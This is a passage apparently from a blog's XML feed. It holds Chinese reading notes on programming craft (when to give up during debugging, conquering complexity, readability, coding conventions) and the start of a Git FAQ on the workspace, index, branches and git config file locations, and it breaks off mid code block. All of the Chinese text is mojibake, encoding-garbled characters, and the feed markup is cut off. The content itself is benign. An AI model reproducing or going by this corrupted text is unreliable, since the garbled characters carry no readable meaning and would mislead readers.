ä¸Šå¡å£³æ—¶ï¼ŒåšæŒå¾ˆéš¾è®©äººç§°é“ã€‚ä¸å¦¨å¦è¾Ÿè¹Šå¾„ï¼Œå°è¯•é‡æ–°è®¾è®¡ç±»ï¼Œæˆ–è€…ç»•è¿‡å»ï¼Œä»¥åå›å¤´å†è¯•è¯•ã€‚å½“ä¸€ç§åŠæ³•è¡Œä¸é€šæ—¶ï¼Œæ­£å¥½å¯ä»¥æ¢ä¸ªåŠæ³•è¯•è¯•ã€‚</p><p>è°ƒè¯•æ—¶ï¼ŒèŠ± 4 ä¸ªå°æ—¶å¹²æ‰æŸä¸ªé”™è¯¯è‚¯å®šä¼šå¾ˆæœ‰æ»¡è¶³æ„Ÿï¼›ä½†é€šå¸¸æœ€å¥½åªè¦æœ‰ä¸€æ®µæ—¶é—´æ²¡æœ‰è¿›å±•ï¼Œæ¯”å¦‚ 15 åˆ†é’Ÿï¼Œå°±è¯¥æ”¾å¼ƒæ’é”™è¿‡ç¨‹ï¼Œè®©æ½œæ„è¯†ä»”ç»†å“å“ã€‚æƒ³ä¸ªå…¶ä»–æ³•å­å°†é—®é¢˜ç»•å¼€ï¼šä»å¤´ç¼–å†™æœ‰éº»çƒ¦çš„ä»£ç æ®µï¼›æ¸…ç†æ€ç»ªåå†æ¥åšã€‚å’Œè®¡ç®—æœºé”™è¯¯æ–—æ°”æ˜¯ä¸æ˜æ™ºçš„ï¼Œæ›´å¥½çš„æ–¹æ³•æ˜¯é¿å¼€å®ƒä»¬ã€‚</p><p>çŸ¥é“ä½•æ—¶æ”¾å¼ƒå¾ˆéš¾ï¼Œä½†è¿™æ˜¯å¿…é¡»é¢å¯¹çš„é—®é¢˜ã€‚å½“ä½ é­å—æŒ«æŠ˜æ—¶ï¼Œæå‡ºæ­¤é—®é¢˜æ­£æ˜¯æ—¶å€™ã€‚æå‡ºå¹¶ä¸æ˜¯è¯´è¿™æ˜¯å°±æ”¾å¼ƒï¼Œè€Œæ˜¯è¯¥ä¸ºç›®å‰çš„è¡Œä¸ºè®¾ç½®åº•çº¿äº†ï¼šâ€œè¦æ˜¯è¿™ä¸ªæ–¹æ³•30åˆ†é’Ÿå†…è¿˜ä¸èƒ½è§£å†³é—®é¢˜ï¼Œæˆ‘å°±ä¼šèŠ±ååˆ†é’Ÿæƒ³äº›å…¶ä»–åŠæ³•ï¼Œå†ç”¨ä¸€ä¸ªå°æ—¶å°è¯•æœ€å¯è¡Œçš„åŠæ³•â€ã€‚</p><p>ä»»ä½•æ—¥åå‡ºè‰²çš„ç¨‹åºå‘˜å‰å‡ å¹´å°±åšå¾—å¾ˆå¥½ã€‚ä»é‚£ä»¥åï¼Œç¨‹åºå‘˜å¥½åå°±å®šå‹äº†ã€‚â€”â€”æ¯”å°” Â· ç›–èŒ¨</p><p>Key Point</p><ul><li>äººçš„ä¸ªæ€§å¯¹å…¶ç¼–ç¨‹èƒ½åŠ›æœ‰ç›´æ¥å½±å“</li><li>æœ€æœ‰å…³ç³»çš„æ€§æ ¼ä¸ºï¼šè°¦è™šã€æ±‚çŸ¥æ¬²ã€è¯šå®ã€åˆ›é€ æ€§å’Œçºªå¾‹ï¼Œä»¥åŠé«˜æ˜çš„å·æ‡’</li><li>ç¨‹åºå‘˜é«˜æ‰‹çš„æ€§æ ¼ä¸å¤©åˆ†æ— å…³ï¼Œè€Œä»»ä½•äº‹éƒ½ä¸ä¸ªäººå‘å±•ç›¸å…³</li><li>å‡ºä¹æ„æ–™çš„æ˜¯ï¼Œå°èªæ˜ã€ç»éªŒã€åšæŒå’Œç–¯ç‹‚æ—¢æœ‰åŠ©ä¹Ÿæœ‰å®³</li><li>å¾ˆå¤šç¨‹åºå‘˜ä¸æ„¿ä¸»åŠ¨å¸æ”¶æ–°çš„çŸ¥è¯†å’ŒæŠ€æœ¯ï¼Œåªä¾é å·¥ä½œæ—¶å¶å°”æ¥è§¦æ–°çš„ä¿¡æ¯ã€‚å¦‚æœèƒ½æŠ½å‡ºå°‘é‡æ—¶é—´é˜…è¯»å’Œå­¦ä¹ ç¼–ç¨‹çŸ¥è¯†ï¼Œè¦ä¸äº†å¤šä¹…å°±èƒ½é¹¤ç«‹é¸¡ç¾¤</li><li>å¥½æ€§æ ¼ä¸åŸ¹å…»æ­£ç¡®çš„ä¹ æƒ¯å…³ç³»ç”šå¤§ã€‚è¦æˆä¸ºæ°å‡ºçš„ç¨‹åºå‘˜ï¼Œå…ˆè¦å…»æˆè‰¯å¥½ä¹ æƒ¯ï¼Œå…¶ä»–è‡ªç„¶æ°´åˆ°æ¸ æˆ</li></ul><h2 id="ç¬¬34ç« -è½¯ä»¶å·¥è‰ºçš„è¯é¢˜"><a href="#ç¬¬34ç« -è½¯ä»¶å·¥è‰ºçš„è¯é¢˜" class="headerlink" title="ç¬¬34ç«  è½¯ä»¶å·¥è‰ºçš„è¯é¢˜"></a>ç¬¬34ç«  è½¯ä»¶å·¥è‰ºçš„è¯é¢˜</h2><h3 id="å¾æœå¤æ‚æ€§"><a href="#å¾æœå¤æ‚æ€§" class="headerlink" title="å¾æœå¤æ‚æ€§"></a>å¾æœå¤æ‚æ€§</h3><p>è½¯ä»¶å¼€å‘çš„æ ¸å¿ƒæ˜¯é™ä½ç³»ç»Ÿçš„å¤æ‚åº¦</p><ul><li>å¦‚æœé‡‡ç”¨å®šä¹‰è‰¯å¥½çš„ä¸€è‡´çš„ç±»æ¥å£ï¼Œå°±æ— é¡»æ“å¿ƒç±»çš„å®ç°ç»†èŠ‚ï¼Œä»è€Œç®€åŒ–è‡ªå·±çš„å·¥ä½œã€‚</li><li>é‡‡ç”¨ç¼–ç è§„èŒƒä¸»è¦ä¹Ÿæ˜¯ä¸ºäº†é™ä½å¤æ‚åº¦ã€‚</li><li>å„ç§å½¢å¼çš„æŠ½è±¡å¯¹äºç®¡ç†å¤æ‚åº¦éƒ½æ˜¯å¾ˆå¼ºå¤§çš„å·¥å…·ã€‚è®¡ç®—æœºç§‘å­¦æœ€äº†ä¸èµ·çš„æˆå°±å°±æ˜¯ä»æœºå™¨è¯­è¨€è·ƒè¿›åˆ°é«˜çº§è¯­è¨€ï¼ˆç¨‹åºå‘˜ä¸å†æ“å¿ƒç‰¹å®šçš„ç¡¬ä»¶ç»†èŠ‚ï¼Œè€Œèƒ½ä¸“å¿ƒäºç¼–ç¨‹ï¼‰ï¼Œå­ç¨‹åºçš„æƒ³æ³•åˆ™æ˜¯å¦ä¸€ä¸ªå·¨å¤§çš„è¿›æ­¥ï¼Œéšåçš„è¿›æ­¥æ˜¯ç±»å’Œç¨‹åºåŒ…ã€‚</li><li>ä»¥åŠŸèƒ½å¯¹å˜é‡å‘½åèƒ½æå‡æŠ½è±¡å±‚æ¬¡ã€‚</li></ul><h3 id="ç²¾é€‰å¼€å‘è¿‡ç¨‹"><a href="#ç²¾é€‰å¼€å‘è¿‡ç¨‹" class="headerlink" title="ç²¾é€‰å¼€å‘è¿‡ç¨‹"></a>ç²¾é€‰å¼€å‘è¿‡ç¨‹</h3><ul><li>å¯¹äºå°é¡¹ç›®ï¼Œç¨‹åºå‘˜çš„ä¸ªäººæ‰èƒ½å¯¹è½¯ä»¶è´¨é‡å½±å“æœ€å¤§ï¼›å¯¹äºå¤šäººåä½œçš„é¡¹ç›®ï¼Œç»„ç»‡æ€§çš„é‡è¦è¶…è¿‡äº†ä¸ªäººæŠ€èƒ½ã€‚</li><li>éœ€æ±‚å¤±è¯¯çš„æˆæœ¬è¿œé«˜äºæ„å»ºé”™è¯¯</li><li>æ‰“å¥½åœ°åŸºåå†ç›–æˆ¿å­</li><li>è½¯ä»¶å¼€å‘ä¸­ï¼Œè´¨é‡ä¸€å¼€å§‹å°±è¦é€æ­¥å»ºç«‹èµ·æ¥ã€‚é‚£ç§å…ˆæ‹¼å‡‘ä»£ç ï¼Œå†é€šè¿‡æµ‹è¯•æå‡ºç¼ºé™·çš„æ€è·¯æ˜¯å®Œå…¨é”™è¯¯çš„ã€‚</li><li>ä¸æˆç†Ÿçš„ä¼˜åŒ–æ˜¯å¦ä¸€ä¸ªè¿‡ç¨‹æ€§é”™è¯¯ã€‚è¡Œä¹‹æœ‰æ•ˆçš„å¼€å‘è¿‡ç¨‹æ˜¯åœ¨å¼€å§‹æ—¶ç²—è°ƒï¼Œåæ¥å†è¿›è¡Œç²¾è°ƒã€‚å¦‚æœä½ æ˜¯ä¸ªé›•åˆ»åŒ ï¼Œåº”åœ¨æ‰“ç£¨ç»†èŠ‚å‰å°±å°†å¤§è‡´çš„è½®å»“åˆ»ç”»å‡ºæ¥ã€‚è¿‡æ—©ä¼˜åŒ–æµªè´¹æ—¶é—´ï¼Œå› ä¸ºä½ ä¼šèŠ±æ—¶é—´å»ç²¾é›•ç»†ç¢åŸæœ¬ä¸å¿…åšçš„ä»£ç æ®µã€‚ä½ å¯èƒ½ä¼šæ‰“ç£¨æœ¬å·²è¶³å¤ŸçŸ­å°è¶³å¤Ÿå¿«é€Ÿçš„ä»£ç æ®µï¼›ä½ å¯èƒ½ä¼šæ¶¦è‰²æ—¥åå°†è¦ä¸¢å¼ƒçš„ä»£ç ã€‚</li><li>å¦‚æœéµç…§å†™ä¼ªä»£ç å†å¯¹å…¶å¡«å……ä»£ç çš„æ­¥éª¤ï¼Œå°±èƒ½äº«å—åˆ°è‡ªä¸Šè€Œä¸‹çš„è®¾è®¡å¥½å¤„ã€‚ä½ ä¹Ÿåº”ç¡®ä¿å‘ä»£ç ä¸­åŠ å…¥æ³¨é‡Šï¼Œè€Œä¸æ˜¯ä»¥åå†æ·»åŠ è¿›å»ã€‚</li></ul><h3 id="é¦–å…ˆä¸ºäººå†™ç¨‹åºï¼Œå…¶æ¬¡æ‰æ˜¯æœºå™¨"><a href="#é¦–å…ˆä¸ºäººå†™ç¨‹åºï¼Œå…¶æ¬¡æ‰æ˜¯æœºå™¨" class="headerlink" title="é¦–å…ˆä¸ºäººå†™ç¨‹åºï¼Œå…¶æ¬¡æ‰æ˜¯æœºå™¨"></a>é¦–å…ˆä¸ºäººå†™ç¨‹åºï¼Œå…¶æ¬¡æ‰æ˜¯æœºå™¨</h3><p>å·®çš„ç¨‹åºï¼šå¥½ä¼¼è¿·å®«ä¸€æ ·ä»¤äººæ‘¸ä¸æ¸…æ–¹å‘ï¼Œå¤¹æ‚ç€å„ç§èŠ±æ‹›å’Œæ— å…³æ³¨é‡Šã€‚<br>å¥½çš„ç¨‹åºï¼šç®—æ³•ç²¾å‡†ï¼Œç»“æ„ç´§å‡‘ï¼Œæ€§èƒ½å¥½ï¼Œæ³¨é‡Šæ¸…æ™°å¾—ä½“ã€‚</p><ul><li>å¥½çš„ç¨‹åºåœ¨ä»¥ä¸‹æ–¹é¢éƒ½æœ‰æ­£é¢å½±å“ï¼š<ul><li>å¯ç†è§£æ€§</li><li>å®¹æ˜“å¤æŸ¥</li><li>é”™è¯¯ç‡</li><li>è°ƒè¯•</li><li>å¯ä¿®æ”¹æ€§</li><li>å¼€å‘æ—¶é—´â€”â€”ä¸Šè¿°å› ç´ ä¹‹ç»¼åˆ</li><li>å¤–åœ¨è´¨é‡â€”â€”ä¸Šè¿°å› ç´ ä¹‹ç»¼åˆ</li></ul></li><li>å¯è¯»çš„ä»£ç å†™èµ·æ¥å¹¶ä¸æ¯”å«ç³Šçš„ä»£ç å¤šèŠ±æ—¶é—´ï¼Œè¿è¡Œæ—¶è‡³å°‘ä¸æ¯”åè€…æ…¢ã€‚å¦‚æœä½ èƒ½è½»æ¾é˜…è¯»è‡ªå·±å†™çš„ä»£ç ï¼Œç¡®ä¿è¯¥ä»£ç èƒ½å·¥ä½œä¹Ÿä¼šæ›´å®¹æ˜“ã€‚</li><li>ä½¿ä»£ç å¯è¯»æ€§å¥½å¹¶éæ˜¯å¼€å‘è¿‡ç¨‹ä¸­çš„å¯æœ‰å¯æ— éƒ¨åˆ†ï¼Œä¸ºäº†èŠ‚çœç¼–å†™ä»£ç çš„æ—¶é—´è€Œä¸é¡¾é˜…è¯»å®ƒçš„æ—¶é—´ï¼Œæ˜¯ä¸ç»æµçš„ã€‚ä½ åº”è¯¥åŠªåŠ›å†™å¥½ä»£ç ,è¿™å¯ä»¥ä¸€æ¬¡åšåˆ°çš„ï¼›è¿™è¿œæ¯”ä½ åŠªåŠ›å»è¯»åä»£ç åˆ’ç®—ï¼Œå› ä¸ºé‚£ä¸å¾—ä¸ä¸€æ¬¡æ¬¡åœ°åå¤åšã€‚</li><li>æé«˜å¯è¯»æ€§çš„æ–¹æ³•ï¼šå¥½çš„ç±»å(åŠå­ç¨‹åºåã€å˜é‡å)ã€ç²¾å¿ƒçš„å¸ƒå±€ã€çŸ­å°çš„å­ç¨‹åºï¼›å°†å¤æ‚çš„é€»è¾‘æµ‹è¯•éšè—åœ¨å¸ƒå°”å‡½æ•°ä¸­ï¼›æŠŠä¸­é—´ç»“æœèµ‹å€¼ç»™å˜é‡ï¼Œä»¥ä½¿å¤æ‚è¿ç®—æ¸…æ™°åŒ–ç­‰ç­‰ã€‚ä»»ä½•å•ä¸€çš„æŠ€æœ¯å¯¹ç¨‹åºå¯è¯»æ€§çš„æ”¹å–„éƒ½æ˜¯äº›è®¸çš„ï¼Œä½†è®¸å¤šå¾®å°çš„æ”¹è¿›è¿­åŠ èµ·æ¥ï¼Œå°±èƒ½ä½¿ç¨‹åºé¢è²Œä¸€æ–°ã€‚</li></ul><h3 id="å€ŸåŠ©è§„èŒƒé›†ä¸­æ³¨æ„åŠ›"><a href="#å€ŸåŠ©è§„èŒƒé›†ä¸­æ³¨æ„åŠ›" class="headerlink" title="å€ŸåŠ©è§„èŒƒé›†ä¸­æ³¨æ„åŠ›"></a>å€ŸåŠ©è§„èŒƒé›†ä¸­æ³¨æ„åŠ›</h3><ul><li>è§„èŒƒèƒ½å¤Ÿç²¾ç¡®åœ°ä¼ è¾¾é‡è¦ä¿¡æ¯ã€‚é‡‡ç”¨å‘½åè§„èŒƒåï¼ŒåŒºåŒºä¸€ä¸ªå­—ç¬¦å°±å¯ä»¥åŒºåˆ†å±€éƒ¨å˜é‡ã€ç±»å˜é‡å’Œå…¨å±€å˜é‡ï¼›å¤§å°å†™å­—æ¯èƒ½ç²¾ç¡®åŒºåˆ«ç±»å‹ã€å…·åå¸¸é‡å’Œå˜é‡;å¯¹é½è§„èŒƒèƒ½å¤Ÿç²¾ç¡®æŒ‡ç¤ºå‡ºè¯­å¥é—´çš„å…³ç³»ã€‚</li><li>è§„èŒƒå¯ä»¥ä½¿ä½ å…é™¤å„ç§é£é™©ã€‚é€šè¿‡å»ºç«‹ç¦æ­¢ä½¿ç”¨å±é™©åšæ³•çš„è§„èŒƒï¼Œå¯ä»¥åœ¨éœ€è¦ç”¨å®ƒä»¬æ—¶é™åˆ¶è¿™äº›åšæ³•ï¼Œæˆ–è€…é˜²èŒƒå®ƒä»¬å¯èƒ½çš„å±é™©ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡ç¦æ­¢å…¨å±€å˜é‡æˆ–åœ¨ä¸€è¡Œé‡Œå†™å¤šæ¡è¯­å¥ï¼Œé¿å…è¿™äº›å±é™©çš„ç”¨æ³•ã€‚é€šè¿‡è¦æ±‚å¯¹å¤æ‚è¡¨è¾¾å¼åŠ æ‹¬å·ã€åœ¨æŒ‡é’ˆè¢«åˆ é™¤åè¦ç½®ç©ºä»¥é˜²è¯¯ç”¨ï¼Œé˜²èŒƒå¯èƒ½çš„å±é™©ã€‚</li><li>è§„èŒƒå¢åŠ äº†å¯¹åº•å±‚å·¥ä½œçš„å¯é¢„è§æ€§ã€‚å¯¹å­˜å‚¨å™¨è¯·æ±‚ã€é”™è¯¯ã€è¾“å…¥/è¾“å‡ºå’Œç±»æ¥å£æœ‰è§„èŒƒçš„å¤„ç†ï¼Œèƒ½å¤Ÿä¸ºä»£ç åŠ å…¥æœ‰æ„ä¹‰çš„ç»“æ„ï¼Œä¾¿äºå…¶ä»–ç¨‹åºå‘˜å¼„æ‡‚ä½ çš„ç¨‹åºã€‚å…¨å±€å˜é‡è®©è¯»è€…å˜å¾—æ²¡æœ‰æŠŠæ¡ã€‚æœ‰äº†å¥½çš„è§„èŒƒï¼Œä½ å’Œä½ çš„è¯»è€…å°±æœ‰äº†æ›´å¥½çš„é»˜å¥‘ï¼Œå°±èƒ½å‡å°‘å¿…é¡»æ¶ˆåŒ–çš„ç»†èŠ‚æ•°é‡ï¼Œåè¿‡æ¥åˆè¿›ä¸€æ­¥åŠ æ·±äº†å¯¹ç¨‹åºçš„ç†è§£ã€‚</li><li>åœ¨å¤§å‹é¡¹ç›®å·¥ä½œä¸­ï¼Œæœ‰æ—¶ç¨‹åºå‘˜ä»¬ä¼šè§„èŒƒè¿‡äº†å¤´ã€‚ç”±äºè®¾ç«‹è®¸å¤šè§„èŒƒå’ŒåŸåˆ™,å…‰æ˜¯è®°ä½è¿™äº›ä¸œè¥¿éƒ½é¢‡èŠ±æ—¶é—´ã€‚ä½†å°å‹é¡¹ç›®çš„ç¨‹åºå‘˜å¸¸å¸¸ç¼ºå°‘è§„èŒƒï¼Œåˆ™æ˜¯å› ä¸ºæ²¡æœ‰å……åˆ†ä½“ä¼šåˆ°è‡ªè§‰éµå®ˆè§„èŒƒæ—¶çš„å¥½å¤„ã€‚åº”ç†è§£å…¶çœŸæ­£ä»·å€¼ï¼Œå¹¶å……åˆ†åˆ©ç”¨è§„èŒƒï¼›ä½¿ç”¨è§„èŒƒä»¥æä¾›æ‰€éœ€çš„ç»“æ„ã€‚</li></ul><h3 id="å½“å¿ƒè½çŸ³"><a href="#å½“å¿ƒè½çŸ³" class="headerlink" title="å½“å¿ƒè½çŸ³"></a>å½“å¿ƒè½çŸ³</h3><ul><li>ä¸€å¤©å†™äº†ä¸€å¤§å †ä»£ç ï¼Œä¹‹åèŠ±ä¸¤ä¸ªæ˜ŸæœŸå»è°ƒè¯•ä¸æ˜¯å·§å¦™çš„åŠæ³•</li><li>æ·±å…¥ä¸€ä¸ªç¨‹åºæ—¶ï¼Œåº”æ³¨æ„é‚£äº›æŒ‡ç¤ºç¨‹åºä¸­æŸäº›åœ°æ–¹è®¾è®¡æ¬ ä½³çš„è­¦å‘Šä¿¡æ¯ã€‚ä¸å®¹æ˜“å†™æ³¨é‡Šï¼Œä¸å®¹æ˜“å‘½åå˜é‡ï¼Œä¸å®¹æ˜“å°†é—®é¢˜åˆ†è§£æˆæ¥å£æ¸…æ™°çš„å‡ ä¸ªç±»ï¼Œéƒ½è¯´æ˜ç¼–ç å‰è¿˜éœ€è¦å†è€ƒè™‘è®¾è®¡ã€‚æ— èŠçš„å‘½åæˆ–è€…æ— æ³•åœ¨æ³¨é‡Šä¸­ç²¾ç¡®åœ°æè¿°ä¸€æ®µä»£ç çš„æ„æ€ï¼ŒåŒæ ·æ˜¯ä¸å¥½çš„ä¿¡å·ã€‚åˆ°ä½ å¯¹è®¾è®¡èƒ¸æœ‰æˆç«¹æ—¶ï¼Œåº•å±‚çš„ç»†èŠ‚ä»£ç å°±ä¼šå¦‚æ³‰æ¶Œè€Œæ¥ã€‚</li><li>è­¦æƒ•ç¨‹åºå‡ºç°éš¾ä»¥ç†è§£çš„è¿¹è±¡ã€‚ä»»ä½•ä¸å®‰éƒ½æ˜¯æš—ç¤ºã€‚è¦æ˜¯è¿ä½ éƒ½è§‰å¾—éš¾ï¼Œä»¥åçš„ç¨‹åºå‘˜å°±æ›´ä¸ç”¨æäº†ã€‚å¦‚æœä½ èƒ½è´¹ç¥åœ°æ”¹è¿›ç¨‹åºï¼Œä»–ä»¬ä¼šæ„Ÿæ¿€ä½ çš„ã€‚ä¸æ˜¯çœ‹æ‡‚ä»£ç ï¼Œè€Œæ˜¯é çŒœæµ‹æ¥ç†è§£ä»£ç ï¼ŒåŒæ ·ä¹Ÿè¯´æ˜ä»£ç å¤ªå¤æ‚ã€‚æœ‰éš¾åº¦å°±è¯´æ˜æœ‰é—®é¢˜ï¼Œæ‰€ä»¥åº”è®¾æ³•ç®€åŒ–ä¹‹ã€‚</li><li>æ‰¾ä¸åˆ°é”™è¯¯æœ€å¸¸è§çš„åŸå› å¸¸å¸¸æ˜¯å› ä¸ºå¿½è§†é”™è¯¯ï¼Œè¿™äº›é”™è¯¯åœ¨æµ‹è¯•è¾“å‡ºä¸­èƒ½å¤Ÿçœ‹åˆ°ï¼Œå´æ²¡æœ‰äººæ³¨æ„ã€‚</li><li>å…³æ³¨è­¦å‘Šä¿¡æ¯ä¸å¦ä¹Ÿç›´æ¥å½±å“åˆ°æœ€ç»ˆäº§å“çš„è´¨é‡ã€‚</li></ul><hr><blockquote><p>è¯»åæ„Ÿï¼šåœ¨ç¼–ç¨‹çš„ä¸–ç•Œé‡Œï¼Œè™½ç„¶å„ç§è¯­è¨€ç™¾èŠ±é½æ”¾ï¼Œä½†æˆ‘ä»¬æ‰€é‡åˆ°çš„å¤§éƒ¨åˆ†çš„é—®é¢˜éƒ½æ˜¯ç›¸ä¼¼çš„ã€‚å¹¸å¥½æˆ‘ä»¬å¤„åœ¨äº†æŠ€æœ¯è¯­è¨€çš„æˆç†ŸæœŸï¼Œè€Œä¸”æ‰€é‡åˆ°çš„ 99% çš„é—®é¢˜ Google éƒ½å·²ç»æœ‰äº†ç­”æ¡ˆã€‚</p><p>åœ¨ç¼–ç¨‹ä¸­æœ€å›°éš¾çš„é—®é¢˜ä»ç„¶æ˜¯äººçš„é—®é¢˜ï¼Œæ¯”å¦‚å›¢é˜Ÿåä½œã€ä»£ç é£æ ¼ã€ä»£ç è´¨é‡ç­‰ã€‚ä»»ä½•ç«äº‰çš„æœ¬è´¨éƒ½æ˜¯äººçš„ç«äº‰ï¼Œè€Œäººåœ¨åšä»»ä½•å·¥ä½œæ—¶éƒ½è¦å‹¤äºæ€è€ƒï¼Œäº’è”ç½‘çš„æ™®åŠè®©æ¯ä¸ªäººæ›´åŠ ä¾¿æ·çš„è·å–çŸ¥è¯†ã€‚æˆ‘ä»¬åªæœ‰ä¸æ–­å‘ä¼˜ç§€çš„äººå­¦ä¹ ï¼ŒæŒç»­æ€è€ƒï¼Œæ‰èƒ½è®©æ¯ä¸€å¤©éƒ½ä¸ä¸€æ ·ã€‚å½“æˆ‘ä»¬åœ¨å‘ä¸Šçœ‹åˆ°è¯­è¨€æ¡†æ¶ç™¾èŠ±é½æ”¾æ—¶ï¼Œæ›´éœ€è¦å‘ä¸‹å…³æ³¨è®¡ç®—æœºåŸºç¡€ï¼Œå¹¶ä¸”ä¸è¦è®©è‡ªå·±å±€é™åœ¨ä¸€é—¨è¯­è¨€ä¸­ã€‚æ²¡æœ‰æœ€å¥½çš„å·¥å…·ï¼Œåªæœ‰æœ€åˆé€‚çš„å·¥å…·ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git å¸¸ç”¨å‘½ä»¤ FAQ</title>
      <link href="/post/git-faq/"/>
      <url>/post/git-faq/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7blak7yufj30wk09gmyk.jpg" alt="gitå›¾è§£"></p><a id="more"></a><p>åœ¨å¼€å§‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆæ¥è®²å‡ ä¸ªæ¦‚å¿µï¼Œè¿™å°†æ›´å¥½çš„è®©æˆ‘ä»¬ç†è§£æ¥ä¸‹æ¥çš„å†…å®¹ï¼š</p><h4 id="å·¥ä½œåŒº"><a href="#å·¥ä½œåŒº" class="headerlink" title="å·¥ä½œåŒº"></a>å·¥ä½œåŒº</h4><p>æˆ‘ä»¬æ­£åœ¨ç¼–è¾‘çš„å†…å®¹å°±æ˜¯åœ¨å·¥ä½œåŒºï¼Œä¸Šå›¾ä¸­çš„ workspaceã€‚</p><h4 id="æš‚å­˜åŒº"><a href="#æš‚å­˜åŒº" class="headerlink" title="æš‚å­˜åŒº"></a>æš‚å­˜åŒº</h4><p>æˆ‘ä»¬å°†å·¥ä½œåŒºçš„å†…å®¹é€šè¿‡<code>git add</code>å‘½ä»¤å°±æäº¤åˆ°äº†æš‚å­˜åŒºã€‚ ä¸Šå›¾ä¸­çš„ index</p><h4 id="æœ¬åœ°ä»“åº“"><a href="#æœ¬åœ°ä»“åº“" class="headerlink" title="æœ¬åœ°ä»“åº“"></a>æœ¬åœ°ä»“åº“</h4><p>æˆ‘ä»¬å°†æš‚å­˜åŒºçš„å†…å®¹é€šè¿‡<code>git commit</code>å°±æäº¤åˆ°äº†æœ¬åœ°ä»“åº“ã€‚å†…å®¹çš„ä¿®æ”¹ä»å·¥ä½œåŒº ==&gt; æš‚å­˜åŒº ==&gt; æœ¬åœ°ä»“åº“æ˜¯é¡ºåºæ‰§è¡Œçš„ã€‚ä¸Šå›¾ä¸­çš„ repository</p><h4 id="è¿œç¨‹ä»“åº“"><a href="#è¿œç¨‹ä»“åº“" class="headerlink" title="è¿œç¨‹ä»“åº“"></a>è¿œç¨‹ä»“åº“</h4><p>Git æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç®¡ç†å·¥å…·ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬å°†ä¿®æ”¹çš„å†…å®¹æäº¤åˆ°æœ¬åœ°ä»“åº“åï¼Œå°±å¯ä»¥é€šè¿‡<code>git push</code>å‘½ä»¤æ¨é€åˆ°è¿œç¨‹ä»“åº“ä¸ä»–äººåä½œå®Œæˆé¡¹ç›®ã€‚</p><h4 id="åˆ†æ”¯"><a href="#åˆ†æ”¯" class="headerlink" title="åˆ†æ”¯"></a>åˆ†æ”¯</h4><p>åˆ†æ”¯å¯ä»¥ç†è§£ä¸ºåƒæ ‘æä¸€æ ·æ¥ç®¡ç†æˆ‘ä»¬çš„ä»£ç ï¼Œåˆ†æ”¯å¾ˆå¥½çš„è§£å†³äº†å¤šäººåä½œçš„é—®é¢˜ã€‚å½“æˆ‘ä»¬éœ€è¦å¼€å‘ä¸€ä¸ªæ–°çš„åŠŸèƒ½æ—¶ï¼Œä»ç¨³å®šåˆ†æ”¯ï¼ˆé€šå¸¸æ˜¯ master æˆ–è€… releaseï¼‰æ–°å»ºåˆ†æ”¯å¼€å‘ï¼Œå½“å¼€å‘å®Œæˆå¹¶æµ‹è¯•é€šè¿‡åï¼Œå†é€šè¿‡<code>git merge</code>åˆå¹¶å…¥ç¨³å®šåˆ†æ”¯å‘å¸ƒã€‚</p><h1 id="FAQ"><a href="#FAQ" class="headerlink" title=" FAQ "></a><center> FAQ </center ></h1><h2 id="Git-é…ç½®"><a href="#Git-é…ç½®" class="headerlink" title="Git é…ç½®"></a>Git é…ç½®</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>git config</code>å‘½ä»¤æ¥é…ç½® Gitï¼Œé…ç½®æ–‡ä»¶å¯ä»¥å­˜æ”¾åœ¨ä»¥ä¸‹ä¸‰ä¸ªä¸åŒçš„åœ°æ–¹ï¼š</p><ul><li><code>/etc/gitconfig</code> æ–‡ä»¶ï¼šç³»ç»Ÿä¸­å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½æ™®éé€‚ç”¨çš„é…ç½®ã€‚è‹¥ä½¿ç”¨ <code>git config</code> æ—¶ç”¨ <code>--system</code> é€‰é¡¹ï¼Œè¯»å†™çš„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶ã€‚</li><li><code>~/.gitconfig</code> æ–‡ä»¶ï¼šç”¨æˆ·ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶åªé€‚ç”¨äºè¯¥ç”¨æˆ·ã€‚è‹¥ä½¿ç”¨ <code>git config</code> æ—¶ç”¨ <code>--global</code> é€‰é¡¹ï¼Œè¯»å†™çš„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶ã€‚</li><li>å½“å‰ä»“åº“çš„ Git ç›®å½•ä¸­çš„é…ç½®æ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯å·¥ä½œç›®å½•ä¸­çš„ <code>.git/config</code> æ–‡ä»¶ï¼‰ï¼šè¿™é‡Œçš„é…ç½®ä»…ä»…é’ˆå¯¹å½“å‰ä»“åº“æœ‰æ•ˆã€‚æ¯ä¸€ä¸ªçº§åˆ«çš„é…ç½®éƒ½ä¼šè¦†ç›–ä¸Šå±‚çš„ç›¸åŒé…ç½®ï¼Œæ‰€ä»¥ <code>.git/config</code> é‡Œçš„é…ç½®ä¼šè¦†ç›– <code>/etc/gitconfig</code> ä¸­çš„åŒåå˜é‡ã€‚</li></ul><p>åœ¨ Windows ç³»ç»Ÿä¸Šï¼ŒGit ä¼šæ‰¾å¯»ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ <code>.gitconfig</code> æ–‡ä»¶ã€‚ä¸»ç›®å½•å³ <code>$HOME</code> å˜é‡æŒ‡å®šçš„ç›®å½•ï¼Œä¸€èˆ¬éƒ½æ˜¯ <code>C:\Documents and Settings\$USER</code>ã€‚æ­¤å¤–ï¼ŒGit è¿˜ä¼šå°è¯•æ‰¾å¯» <code>/etc/gitconfig</code> æ–‡ä»¶ï¼Œåªä¸è¿‡çœ‹å½“åˆ Git è£…åœ¨ä»€ä¹ˆç›®å½•ï¼Œå°±ä»¥æ­¤ä½œä¸ºæ ¹ç›®å½•æ¥å®šä½ã€‚</p><h3 id="ç”¨æˆ·ä¿¡æ¯é…ç½®"><a href="#ç”¨æˆ·ä¿¡æ¯é…ç½®" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯é…ç½®"></a>ç”¨æˆ·ä¿¡æ¯é…ç½®</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 